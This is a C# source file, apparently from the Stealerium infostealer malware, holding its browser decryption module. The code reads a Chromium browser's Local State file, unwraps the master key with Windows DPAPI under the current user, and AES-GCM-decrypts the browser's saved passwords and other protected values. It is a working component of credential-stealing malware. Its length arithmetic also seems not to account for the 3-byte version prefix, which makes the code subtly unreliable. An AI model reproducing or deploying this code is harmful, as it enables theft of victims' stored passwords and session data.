using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Stealerium.Stub.Target.Browsers.Common.Encryption
{
    internal static class BrowserCrypto
    {
        private const int GcmTagSize = 16;
        private const int GcmNonceSize = 12;
        private const string KeyPrefix = "DPAPI";

        public static byte[] GetMasterKey(string localStatePath)
        {
            try
            {
                if (!File.Exists(localStatePath))
                {
                    return null;
                }

                var jsonContent = File.ReadAllText(localStatePath);
                var jsonNode = JsonNode.Parse(jsonContent);
                var encryptedKey = Convert.FromBase64String(jsonNode["os_crypt"]["encrypted_key"].GetValue<string>());

                // Remove DPAPI prefix
                if (!HasValidPrefix(encryptedKey))
                {
                    return null;
                }

                var keyWithoutPrefix = new byte[encryptedKey.Length - KeyPrefix.Length];
                Array.Copy(encryptedKey, KeyPrefix.Length, keyWithoutPrefix, 0, keyWithoutPrefix.Length);

                // Decrypt the key using DPAPI
                return ProtectedData.Unprotect(keyWithoutPrefix, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static string DecryptPassword(byte[] masterKey, byte[] encryptedData)
        {
            try
            {
                if (encryptedData == null || encryptedData.Length < 31 || masterKey == null)
                    return null;

                var nonce = new byte[GcmNonceSize];
                var ciphertext = new byte[encryptedData.Length - GcmNonceSize - GcmTagSize];
                var tag = new byte[GcmTagSize];

                Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
                Array.Copy(encryptedData, 3 + nonce.Length, ciphertext, 0, ciphertext.Length);
                Array.Copy(encryptedData, encryptedData.Length - tag.Length, tag, 0, tag.Length);

                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(masterKey), GcmTagSize * 8, nonce);
                cipher.Init(false, parameters);

                var plaintext = new byte[cipher.GetOutputSize(ciphertext.Length + tag.Length)];
                var len = cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, plaintext, 0);
                cipher.ProcessBytes(tag, 0, tag.Length, plaintext, len);
                cipher.DoFinal(plaintext, len);

                return Encoding.UTF8.GetString(plaintext);
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static string DecryptValue(string encryptedValue)
        {
            try
            {
                return Encoding.UTF8.GetString(
                    ProtectedData.Unprotect(
                        Convert.FromBase64String(encryptedValue),
                        null,
                        DataProtectionScope.CurrentUser
                    )
                );
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static bool HasValidPrefix(byte[] encryptedKey)
        {
            if (encryptedKey.Length < KeyPrefix.Length)
                return false;

            for (int i = 0; i < KeyPrefix.Length; i++)
            {
                if (encryptedKey[i] != KeyPrefix[i])
                    return false;
            }

            return true;
        }
    }
}
